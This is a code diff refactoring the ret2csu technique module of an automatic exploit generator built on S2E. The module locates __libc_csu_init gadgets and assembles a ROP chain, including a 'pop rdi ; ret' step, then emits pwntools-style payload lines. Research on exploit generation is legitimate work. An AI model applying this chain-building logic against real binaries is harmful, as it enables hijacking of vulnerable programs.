@@ -20,6 +20,7 @@
 
 #include <s2e/Plugins/Requiem/Requiem.h>
 #include <s2e/Plugins/Requiem/Utils/StringUtil.h>
+#include <s2e/Plugins/Requiem/Expr/BinaryExprEvaluator.h>
 
 #include <algorithm>
 #include <cassert>
@@ -32,16 +33,21 @@ using namespace klee;
 
 namespace s2e::plugins::requiem {
 
-Ret2csu::Ret2csu(Requiem &ctx,
-                 std::string arg1,
-                 std::string arg2,
-                 std::string arg3,
-                 std::string addr)
+using SymbolicRopPayload = Technique::SymbolicRopPayload;
+using ConcreteRopPayload = Technique::ConcreteRopPayload;
+
+
+const std::string Ret2csu::s_libcCsuInit = "__libc_csu_init";
+const std::string Ret2csu::s_libcCsuInitGadget1 = "__libc_csu_init_gadget1";
+const std::string Ret2csu::s_libcCsuInitGadget2 = "__libc_csu_init_gadget2";
+const std::string Ret2csu::s_libcCsuInitCallTarget = "__libc_csu_init_call_target";
+
+Ret2csu::Ret2csu(Requiem &ctx)
     : Technique(ctx),
-      m_arg1(arg1),
-      m_arg2(arg2),
-      m_arg3(arg3),
-      m_addr(addr),
+      m_addr(),
+      m_arg1(),
+      m_arg2(),
+      m_arg3(),
       m_libcCsuInit(),
       m_libcCsuInitGadget1(),
       m_libcCsuInitGadget2(),
@@ -50,50 +56,43 @@ Ret2csu::Ret2csu(Requiem &ctx,
       m_gadget2Regs(),
       m_gadget2CallReg1(),
       m_gadget2CallReg2(),
-      m_ropPayloadList(),
-      m_concretizedRopPayloadList(),
+      m_symbolicRopPayloadList(),
       m_auxiliaryFunction() {
     parseLibcCsuInit();
     searchGadget2CallTarget();
-    buildRopPayloadList();
-    buildConcretizedRopPayloadList();
-    buildAuxiliaryFunction();
     resolveRequiredGadgets();
+
+    buildSymbolicRopPayloadList();
+    buildAuxiliaryFunction();
 }
 
 
 bool Ret2csu::checkRequirements() const {
-   const auto &sym = m_ctx.getExploit().getElf().symbols();
-   return sym.find("__libc_csu_init") != sym.end();
+   auto symbolMap = m_ctx.getExploit().getElf().symbols();
+   return symbolMap.find(s_libcCsuInit) != symbolMap.end();
 }
 
 void Ret2csu::resolveRequiredGadgets() {
     // Gadgets
-    m_ctx.getExploit().registerSymbol("__libc_csu_init", m_libcCsuInit);
-    m_ctx.getExploit().registerSymbol("__libc_csu_init_gadget1", m_libcCsuInitGadget1);
-    m_ctx.getExploit().registerSymbol("__libc_csu_init_gadget2", m_libcCsuInitGadget2);
+    m_ctx.getExploit().registerSymbol(s_libcCsuInit, m_libcCsuInit);
+    m_ctx.getExploit().registerSymbol(s_libcCsuInitGadget1, m_libcCsuInitGadget1);
+    m_ctx.getExploit().registerSymbol(s_libcCsuInitGadget2, m_libcCsuInitGadget2);
 
     // Memory locations
-    m_ctx.getExploit().registerSymbol("__libc_csu_init_call_target", m_libcCsuInitCallTarget);
+    m_ctx.getExploit().registerSymbol(s_libcCsuInitCallTarget, m_libcCsuInitCallTarget);
 }
 
 std::string Ret2csu::getAuxiliaryFunctions() const {
     return m_auxiliaryFunction;
 }
 
-std::vector<std::vector<std::string>> Ret2csu::getRopPayloadList() const {
-    std::vector<std::vector<std::string>> ret
-        = getRopPayloadList(m_arg1, m_arg2, m_arg3, m_addr, true);
-
-    ret[0].insert(ret[0].begin(), "A8");  // rbp
+std::vector<SymbolicRopPayload> Ret2csu::getSymbolicRopPayloadList() const {
+    auto ret = getSymbolicRopPayloadList(m_addr, m_arg1, m_arg2, m_arg3);
+    ret[0].insert(ret[0].begin(), ConstantExpr::create(0x4141414141414141, Expr::Int64));
     return ret;
 }
 
-std::vector<std::vector<uint64_t>> Ret2csu::getConcretizedRopPayloadList() const {
-    return {};
-}
-
-std::vector<std::string> Ret2csu::getExtraPayload() const {
+ConcreteRopPayload Ret2csu::getExtraPayload() const {
     return {};
 }
 
@@ -102,77 +101,51 @@ std::string Ret2csu::toString() const {
 }
 
 
-std::vector<std::vector<std::string>> Ret2csu::getRopPayloadList(const std::string &arg1,
-                                                                 const std::string &arg2,
-                                                                 const std::string &arg3,
-                                                                 const std::string &addr,
-                                                                 bool arg1IsRdi) const {
-    std::vector<std::string> rop;
+std::vector<SymbolicRopPayload> Ret2csu::getSymbolicRopPayloadList(uint64_t addr,
+                                                                   uint64_t arg1,
+                                                                   uint64_t arg2,
+                                                                   uint64_t arg3) const {
+    SymbolicRopPayload rop;
 
-    for (auto s : m_ropPayloadList[0]) {
-        if (s.find("arg1") != std::string::npos) {
-            rop.push_back(replace(s, "arg1", arg1));
-        } else if (s.find("arg2") != std::string::npos) {
-            rop.push_back(replace(s, "arg2", arg2));
-        } else if (s.find("arg3") != std::string::npos) {
-            rop.push_back(replace(s, "arg3", arg3));
-        } else if (s.find("addr") != std::string::npos) {
-            rop.push_back(replace(s, "addr", addr));
+    for (const ref<Expr> &e : m_symbolicRopPayloadList[0]) {
+        if (auto phe = dyn_cast<PlaceholderExpr>(e)) {
+            // If this expr is a placeholder, replace it now.
+            if (phe->hasTag("arg1")) {
+                rop.push_back(ConstantExpr::create(arg1, Expr::Int64));
+            } else if (phe->hasTag("arg2")) {
+                rop.push_back(ConstantExpr::create(arg2, Expr::Int64));
+            } else if (phe->hasTag("arg3")) {
+                rop.push_back(ConstantExpr::create(arg3, Expr::Int64));
+            } else if (phe->hasTag("addr")) {
+                rop.push_back(ConstantExpr::create(addr, Expr::Int64));
+            } else {
+                throw UnhandledPlaceholderException();
+            }
         } else {
-            rop.push_back(s);
+            // Otherwise, just leave it as it is.
+            rop.push_back(e);
         }
     }
 
-    if (arg1IsRdi) {
+    // If arg1 cannot fit within EDI, chain the gadgets to set RDI.
+    if (arg1 >= (static_cast<uint64_t>(1) << 32)) {
         uint64_t gadgetAddr = m_ctx.getExploit().resolveGadget("pop rdi ; ret");
-        rop.back() = format("p64(0x%x)", gadgetAddr);
-        rop.push_back(format("p64(%s)", arg1.c_str()));
-        rop.push_back(format("p64(%s)", addr.c_str()));
+        rop.back() = ConstantExpr::create(gadgetAddr, Expr::Int64);
+        rop.push_back(ConstantExpr::create(arg1, Expr::Int64));
+        rop.push_back(ConstantExpr::create(addr, Expr::Int64));
     }
 
     return {rop};
-}
-
-std::vector<std::vector<uint64_t>> Ret2csu::getConcretizedRopPayloadList(uint64_t arg1,
-                                                                         uint64_t arg2,
-                                                                         uint64_t arg3,
-                                                                         uint64_t addr,
-                                                                         bool arg1IsRdi) const {
-    std::vector<uint64_t> rop;
-
-    for (size_t i = 0; i < m_ropPayloadList[0].size(); i++) {
-        const std::string &s = m_ropPayloadList[0][i];
-
-        if (s.find("arg1") != std::string::npos) {
-            rop.push_back(arg1);
-        } else if (s.find("arg2") != std::string::npos) {
-            rop.push_back(arg2);
-        } else if (s.find("arg3") != std::string::npos) {
-            rop.push_back(arg3);
-        } else if (s.find("addr") != std::string::npos) {
-            rop.push_back(addr);
-        } else {
-            rop.push_back(m_concretizedRopPayloadList[0][i]);
-        }
-    }
-
-    if (arg1IsRdi) {
-        rop.back() = m_ctx.getExploit().resolveGadget("pop rdi ; ret");
-        rop.push_back(arg1);
-        rop.push_back(addr);
-    }
-
-    return {move(rop)};
 }
 
 void Ret2csu::parseLibcCsuInit() {
     // Since there are several variants of __libc_csu_init(),
     // we'll manually disassemble it and parse the offsets of its two gadgets.
     // XXX: define the string literals.
-    m_libcCsuInit = m_ctx.getExploit().getElf().symbols()["__libc_csu_init"];
+    m_libcCsuInit = m_ctx.getExploit().getElf().symbols()[s_libcCsuInit];
 
     // Convert instruction generator into a list of instructions.
-    std::vector<Instruction> insns = m_ctx.getDisassembler().disasm("__libc_csu_init");
+    std::vector<Instruction> insns = m_ctx.getDisassembler().disasm(s_libcCsuInit);
 
     // Find the offset of gadget1,
     // and save the order of popped registers in gadget1 as a vector.
@@ -242,71 +215,65 @@ void Ret2csu::searchGadget2CallTarget(std::string funcName) {
     std::vector<uint64_t> candidates = {0x403e38};
 
     if (candidates.empty()) {
-        m_ctx.log<WARN>() << "No candidates for __libc_csu_init()'s call target\n";
+        m_ctx.log<WARN>() << "No candidates for " << s_libcCsuInit << "()'s call target\n";
         return;
     }
 
     m_libcCsuInitCallTarget = candidates[0];
 }
 
-void Ret2csu::buildRopPayloadList() {
+void Ret2csu::buildSymbolicRopPayloadList() {
     std::map<std::string, std::string> transform = {
-        {"rsp", "A8"},
-        {"rbx", "p64(0)"},
-        {"rbp", "p64(1)"},
-        {slice(m_gadget2Regs["edi"], 0, 3), "p64(arg1)"},
-        {slice(m_gadget2Regs["rsi"], 0, 3), "p64(arg2)"},
-        {slice(m_gadget2Regs["rdx"], 0, 3), "p64(arg3)"},
-        {m_gadget2CallReg1, "p64(__libc_csu_init_call_target)"}
+        {"rsp", "4141414141414141"},
+        {"rbx", "0"},
+        {"rbp", "1"},
+        {slice(m_gadget2Regs["edi"], 0, 3), "arg1"},
+        {slice(m_gadget2Regs["rsi"], 0, 3), "arg2"},
+        {slice(m_gadget2Regs["rdx"], 0, 3), "arg3"},
+        {m_gadget2CallReg1, s_libcCsuInitCallTarget}
     };
 
-    m_ropPayloadList.resize(1);
-    std::vector<std::string> &rop = m_ropPayloadList[0];
+    m_symbolicRopPayloadList.resize(1);
 
-    rop.push_back("p64(__libc_csu_init_gadget1)");
-    for (int i = 0; i < 7; i++) {
-        rop.push_back(transform[m_gadget1Regs[i]]);
-    }
-    rop.push_back("p64(__libc_csu_init_gadget2)");
-    for (int i = 0; i < 7; i++) {
-        rop.push_back("A8");
-    }
-    rop.push_back("p64(addr)");
-}
+    SymbolicRopPayload &rop = m_symbolicRopPayloadList[0];
 
-void Ret2csu::buildConcretizedRopPayloadList() {
-    std::map<std::string, uint64_t> transform = {
-        {"rsp", 0x4141414141414141},
-        {"rbx", 0},
-        {"rbp", 1},
-        {slice(m_gadget2Regs["edi"], 0, 3), 0},
-        {slice(m_gadget2Regs["rsi"], 0, 3), 0},
-        {slice(m_gadget2Regs["rdx"], 0, 3), 0},
-        {m_gadget2CallReg1, m_libcCsuInitCallTarget}
-    };
-
-    m_concretizedRopPayloadList.resize(1);
-    std::vector<uint64_t> &rop = m_concretizedRopPayloadList[0];
-
-    rop.push_back(m_libcCsuInitGadget1);
+    // XXX: gadget1 is not in elf.sym
+    rop.push_back(BaseOffsetExpr::create(m_ctx.getExploit(), s_libcCsuInitGadget1));
     for (int i = 0; i < 7; i++) {
-        rop.push_back(transform[m_gadget1Regs[i]]);
+        std::string content = transform[m_gadget1Regs[i]];
+
+        if (content == "arg1" || content == "arg2" || content == "arg3") {
+            rop.push_back(PlaceholderExpr::create(content));
+        } else if (isNumString(content)) {
+            uint64_t val = std::stoull(content, nullptr, 16);
+            rop.push_back(ConstantExpr::create(val, Expr::Int64));
+        } else {
+            rop.push_back(BaseOffsetExpr::create(m_ctx.getExploit(), content));
+        }
     }
-    rop.push_back(m_libcCsuInitGadget2);
+    rop.push_back(BaseOffsetExpr::create(m_ctx.getExploit(), s_libcCsuInitGadget2));
     for (int i = 0; i < 7; i++) {
-        rop.push_back(0x4141414141414141);
+        rop.push_back(ConstantExpr::create(0x4141414141414141, Expr::Int64));
     }
-    rop.push_back(0);
+    rop.push_back(PlaceholderExpr::create("addr"));
 }
 
 void Ret2csu::buildAuxiliaryFunction() {
     std::string f;
 
-    for (const auto &payload : m_ropPayloadList[0]) {
-        if (f.empty()) {
-            f += format("    payload  = %s\n", payload.c_str());
+    for (const ref<Expr> &e : m_symbolicRopPayloadList[0]) {
+        std::string s;
+
+        if (auto phe = dyn_cast<PlaceholderExpr>(e)) {
+            s = phe->getTag();
         } else {
-            f += format("    payload += %s\n", payload.c_str());
+            s = BinaryExprEvaluator<std::string>().evaluate(e);
+        }
+
+        if (f.empty()) {
+            f += format("    payload  = p64(%s)\n", s.c_str());
+        } else {
+            f += format("    payload += p64(%s)\n", s.c_str());
         }
     }
 
